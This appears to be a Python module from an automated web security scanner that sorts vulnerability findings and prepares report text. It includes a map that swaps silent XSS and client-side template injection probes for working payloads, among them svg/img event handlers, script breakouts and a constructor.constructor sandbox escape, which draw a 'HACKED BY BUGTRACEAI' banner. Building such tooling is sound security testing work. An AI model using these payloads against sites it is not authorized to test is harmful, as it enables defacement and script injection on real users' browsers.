"""
Finding processing: normalization, deduplication, categorization, enrichment data prep.

All functions are PURE unless marked otherwise.
"""

import re
from collections import defaultdict
from typing import Dict, List, Optional
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from bugtrace.agents.reporting_mod.types import (
    STATIC_ANALYSIS_PATTERNS,
    XSS_UNCONFIRMED_LEVELS,
    INFORMATIONAL_TYPES,
    HEADER_TEMPLATES,
    API_DOCS_TEMPLATES,
    HEADER_READABLE_MAP,
)
from bugtrace.core.validation_status import ValidationStatus
from bugtrace.agents.reporting_mod.formatters import normalize_severity
from bugtrace.reporting.standards import (
    get_default_severity,
    get_cwe_for_vuln,
    get_remediation_for_vuln,
)
from bugtrace.utils.logger import get_logger

logger = get_logger("agents.reporting.finding_processor")


def _safe_evidence_get(finding: Dict, key: str, default: str = "") -> str:
    """Safely extract a key from finding['evidence'], handling string evidence."""
    evidence = finding.get("evidence", {})
    if isinstance(evidence, dict):
        return evidence.get(key, default)
    return default


# Short, type-specific impact lines used as a deterministic fallback (no LLM).
_DEFAULT_IMPACT = {
    "XSS": "Session hijacking, credential theft, defacement, and arbitrary actions performed in the victim's browser.",
    "SQLI": "Unauthorized data access, data manipulation, and potential full database compromise.",
    "CSTI": "Client-side code execution leading to XSS, data theft, and account takeover.",
    "SSTI": "Server-side code execution, potentially leading to full host compromise.",
    "RCE": "Arbitrary command execution on the server, leading to full system compromise.",
    "IDOR": "Unauthorized access to other users' data and resources.",
    "LFI": "Disclosure of sensitive local files and potential code execution.",
    "SSRF": "Access to internal services and cloud metadata, enabling further pivoting.",
    "OPEN_REDIRECT": "Phishing and credential theft by redirecting users to attacker-controlled sites.",
    "BROKEN_ACCESS_CONTROL": "Unauthorized access to privileged functionality or data.",
    "INSECURE_DESERIALIZATION": "Remote code execution via crafted serialized objects.",
}


def _synthesize_description(finding: Dict, vtype: str) -> str:
    """Build a concise, accurate description from the finding's own fields — no LLM.

    Used when a specialist did not set a description and LLM enrichment is unavailable
    (e.g. the XSS specialist relies on the LLM, but the circuit breaker is OPEN), so the
    report / WEB findings card is never blank.
    """
    param = finding.get("parameter") or finding.get("param") or "the affected parameter"
    url = finding.get("url") or "the target endpoint"
    ev = finding.get("evidence") if isinstance(finding.get("evidence"), dict) else {}
    ctx = (
        ev.get("execution_context")
        or finding.get("injection_context_type")
        or finding.get("reflection_context")
        or finding.get("context")
    )
    method = str(finding.get("validation_method") or "").strip()

    if "xss" in vtype.lower():
        xtype = str(finding.get("xss_type") or "reflected").lower()
        ctx_txt = (
            f" The input is reflected in an executable context ({ctx}) and runs "
            f"attacker-controlled JavaScript in the victim's browser."
            if ctx else
            " The input is reflected unsanitized and executes attacker-controlled "
            "JavaScript in the victim's browser."
        )
        desc = f"{xtype.capitalize()} Cross-Site Scripting (XSS) confirmed in parameter '{param}' at {url}.{ctx_txt}"
    else:
        desc = f"{vtype} confirmed in parameter '{param}' at {url}."

    # The payload is NOT appended here. A description is markdown-active prose: a bare
    # payload loses its backslashes (so a JS-string breakout stops breaking out) and, if
    # it looks like a tag, is parsed as HTML and then dropped by the viewer's sanitizer
    # allowlist — the payload simply vanishes. It was also silently cut at 240 characters.
    # Every deliverable renders the payload in its own fenced block, in full, instead.
    if method:
        desc += f" (validated via {method})"
    return desc


def apply_deterministic_baseline(findings: List[Dict]) -> List[Dict]:
    """Guarantee every finding carries severity/description/cwe/remediation/impact WITHOUT
    an LLM. Runs before (and independently of) LLM enrichment so a degraded LLM — circuit
    breaker OPEN, out of credits — never leaves a finding blank in the report or the WEB
    findings card. Only fills missing/empty fields; never overwrites what a specialist set.
    """
    for f in findings:
        if not isinstance(f, dict):
            continue
        vtype = str(f.get("type") or f.get("vulnerability_type") or "").strip()
        if not vtype:
            continue

        if not f.get("severity"):
            ev = f.get("evidence") if isinstance(f.get("evidence"), dict) else {}
            sev = ev.get("severity") or f.get("risk")
            if not sev:
                try:
                    sev = get_default_severity(vtype).value
                except Exception:
                    sev = "HIGH"
            f["severity"] = sev

        if not f.get("cwe"):
            cwe = get_cwe_for_vuln(vtype)
            if cwe:
                f["cwe"] = cwe

        if not f.get("remediation"):
            f["remediation"] = get_remediation_for_vuln(vtype)

        if not f.get("impact"):
            f["impact"] = _DEFAULT_IMPACT.get(
                vtype.upper().replace(" ", "_").replace("-", "_"),
                "May allow an attacker to compromise the confidentiality, integrity, or availability of the application.",
            )

        if not f.get("description"):
            f["description"] = _synthesize_description(f, vtype)

    return findings


# PURE
def categorize_findings(all_findings: List[Dict]) -> Dict[str, List[Dict]]:
    """
    Categorize findings by validation status.

    Handles both:
    - VALIDATED_CONFIRMED: Specialist self-validated (no CDP needed)
    - VALIDATED: CDP-validated findings from AgenticValidator
    """
    from bugtrace.agents.reporting_mod.finding_quality import meets_report_quality
    validated_statuses = {
        "VALIDATED_CONFIRMED",
        "VALIDATED",
        ValidationStatus.VALIDATED_CONFIRMED.value,
        ValidationStatus.FINDING_VALIDATED.value if hasattr(ValidationStatus, 'FINDING_VALIDATED') else "FINDING_VALIDATED",
    }

    return {
        "raw": [f for f in all_findings],
        "validated": [
            f for f in all_findings
            if f.get("status") in validated_statuses
            and has_minimum_evidence(f)
            and meets_report_quality(f)
        ],
        "manual_review": [
            f for f in all_findings
            if f.get("status") == "MANUAL_REVIEW_RECOMMENDED"
            or (f.get("status") in validated_statuses
                and (not has_minimum_evidence(f)
                     or not meets_report_quality(f)))
        ],
        "false_positives": [f for f in all_findings if f.get("status") == "VALIDATED_FALSE_POSITIVE"],
        "pending": [f for f in all_findings if f.get("status") == "PENDING_VALIDATION"]
    }


# PURE
def has_minimum_evidence(finding: Dict) -> bool:
    """
    Safety net: check if a finding has minimum evidence quality to be
    included in validated findings. Findings that claim VALIDATED_CONFIRMED
    but have zero evidence are re-routed to manual_review instead.
    """
    # Non-empty payload = sufficient
    if (finding.get("payload") or "").strip():
        return True
    # Non-trivial evidence dict = sufficient
    evidence = finding.get("evidence", {})
    if isinstance(evidence, dict) and evidence and any(v for v in evidence.values() if v):
        return True
    elif isinstance(evidence, str) and evidence.strip():
        return True
    # Positive confidence or evidence score = sufficient
    if finding.get("evidence_score", 0) > 0 or finding.get("confidence", 0) > 0.5:
        return True
    # Screenshot = sufficient
    if finding.get("screenshot_path"):
        return True
    logger.warning(
        f"[ReportingAgent] Quality gate: {finding.get('type')}/{finding.get('parameter')} "
        f"lacks minimum evidence, routing to manual_review"
    )
    return False


# =============================================================================
# PAYLOAD UPGRADE: Silent probes → Visual PoC for reports
# =============================================================================
# The scanner uses lightweight "silent" payloads (document.title, 7*7) for speed
# and stealth. For the final report the user sees, we upgrade them to their
# visually impactful equivalents so report quality is always premium.

# FOUR invariants hold this constant together. Breaking any one of them makes the
# PoC render nothing while the report still claims a visual banner:
#
# 1. NO WHITESPACE (space/tab/newline) anywhere. It is spliced into UNQUOTED HTML
#    attributes (`<svg onload=` + JS + `>`), and an HTML tokenizer ends an unquoted
#    attribute value at the first whitespace, turning the rest of the banner into
#    junk attributes. Hence no `var `/`let ` keyword and no `function (`; the label's
#    spaces are written as `\x20` escapes, which the JS engine turns back into real
#    spaces at runtime (the rendered banner text is byte-identical either way).
# 2. NO `>` anywhere. In an unquoted attribute value `>` closes the tag, so an arrow
#    function (`(d)=>{...}`) — the obvious whitespace-free way to scope a variable —
#    is truncated at `((d)=` and is NOT usable here.
# 3. STRICT-MODE SAFE. A bare `d=...` is an implicit-global assignment, which is a
#    ReferenceError under `"use strict"` and inside `<script type="module">` (modules
#    are always strict), i.e. on a large share of modern sites. The element is
#    therefore passed into a function expression, whose parameter is a proper local
#    binding: valid in sloppy, strict and module code, and — unlike `globalThis.d=` —
#    it leaves no global behind, so repeated firings cannot collide with each other
#    or with page code.
# 4. IT MUST WIN THE STACKING CONTEST against arbitrary site chrome, or the proof
#    screenshot shows a banner buried under a consent backdrop and Vision reads it as
#    "no exploitation". Three CSS facts decide that, and all three are answered here:
#      a. `z-index` is capped at 2147483647 (32-bit signed max). A site overlay can
#         and does use that exact value, so anything lower loses; ties are broken by
#         tree order, which is why the banner is APPENDED LAST.
#      b. A z-index only competes inside its own stacking context. Any ancestor with
#         `transform`/`filter`/`opacity<1`/`perspective`/`contain` traps the banner
#         underneath that ancestor's own z-index — and `opacity`/`filter` on an
#         ancestor also DIMS it, which a child cannot undo. Appending to
#         `documentElement` puts the banner in the ROOT stacking context, above every
#         in-`body` overlay whatever `body` does. It is also the only parent that
#         always exists (a payload firing before `</body>` made `body.prepend` throw).
#      c. The banner's own visual properties are pinned (`opacity`/`filter`/
#         `transform`/`visibility`/`display`) so inherited page CSS cannot fade,
#         blur, displace or collapse it.
#    Top-layer chrome (a `dialog` opened with `showModal()`, an open popover, a
#    fullscreen element) beats EVERY z-index by spec and cannot be answered from a
#    payload with this charset budget; the screenshot path neutralises it instead —
#    see `XSSVerifier._neutralize_occluders`.
_VISUAL_BANNER_JS = (
    "(function(d){"
    "d.id=`bt-pwn`;"
    "d.setAttribute(`style`,`position:fixed;top:0;left:0;width:100%;"
    "box-sizing:border-box;background:red;color:white;text-align:center;"
    "padding:20px;font-size:24px;font-weight:bold;opacity:1;filter:none;"
    "transform:none;visibility:visible;display:block;z-index:2147483647`);"
    "d.innerText=`HACKED\\x20BY\\x20BUGTRACEAI`;"
    "document.documentElement.append(d)"
    "})(document.createElement(`div`))"
)

# Rendered banner text (what the victim's browser actually shows once the `\x20`
# escapes are evaluated) and its whitespace-free source spelling. Both are checked
# when deciding whether a payload is ALREADY visual, so neither a scan-time visual
# payload (plain spaces) nor a report-time upgraded one (escaped) is upgraded twice.
_VISUAL_BANNER_TEXT = "HACKED BY BUGTRACEAI"
_VISUAL_BANNER_TEXT_ESCAPED = _VISUAL_BANNER_TEXT.replace(" ", "\\x20")

# Map: silent payload → visual payload (exact match)
_PAYLOAD_UPGRADE_MAP = {
    # JS single-quote breakout
    "\\\\';" + "document.title=document.domain//":
        "\\\\';{" + _VISUAL_BANNER_JS + "};//",
    # JS double-quote breakout
    '\\\\";"' + "document.title=document.domain//":
        "\\\\\";" + "{" + _VISUAL_BANNER_JS + "};//",
    # HTML svg onload
    "<svg onload=document.title=document.domain>":
        "<svg onload=" + _VISUAL_BANNER_JS + ">",
    # HTML img onerror
    "<img src=x onerror=document.title=document.domain>":
        "<img src=x onerror=" + _VISUAL_BANNER_JS + ">",
    # Attribute DQ breakout
    "\" onmouseover=document.title=document.domain x=\"":
        "\" onmouseover=" + _VISUAL_BANNER_JS + " x=\"",
    # Attribute SQ breakout
    "' onmouseover=document.title=document.domain x='":
        "' onmouseover=" + _VISUAL_BANNER_JS + " x='",
    # Script tag breakout
    "</script><script>document.title=document.domain</script>":
        "</script><script>" + _VISUAL_BANNER_JS + "</script>",
    # Simple alert payloads → visual
    "\\\\';alert(document.domain)//":
        "\\\\';{" + _VISUAL_BANNER_JS + "};//",
    '\\\\";"alert(document.domain)//':
        "\\\\\";" + "{" + _VISUAL_BANNER_JS + "};//",
}

# CSTI silent payloads → visual equivalents.
# Same whitespace rule as above: a template expression can also land in an unquoted
# HTML attribute, so the banner body is REUSED verbatim (it is backtick-only, so it
# never collides with the single quotes of constructor.constructor('...')).
_CSTI_VISUAL_BANNER = "{{constructor.constructor('" + _VISUAL_BANNER_JS + "')()}}"

#
# Keys are the ARITHMETIC PROBES THE AGENT ACTUALLY SENDS. The map used to hold only
# `{{7*7}}`/`{{7*'7'}}` while CSTIAgent has shipped `{{1000003*1000003}}` since 3.6.17
# (7*7=49 collides with real page content; the long product does not), so no CSTI
# finding could ever match and the whole CSTI branch was dead.
#
# Only `{{ }}` forms appear here on purpose. The banner escapes an Angular/Vue sandbox
# via constructor.constructor; substituting it for a `${...}`, `<%= %>`, `#{...}` or
# `[[...]]` probe would hand the reader a PoC that cannot fire on the engine that was
# actually exploited. Those keep their arithmetic proof instead.
_CSTI_UPGRADE_MAP = {
    "{{1000003*1000003}}": _CSTI_VISUAL_BANNER,
    "{{ 1000003*1000003 }}": _CSTI_VISUAL_BANNER,
    "{{7*7}}": _CSTI_VISUAL_BANNER,
    "{{7*'7'}}": _CSTI_VISUAL_BANNER,
}


# PURE
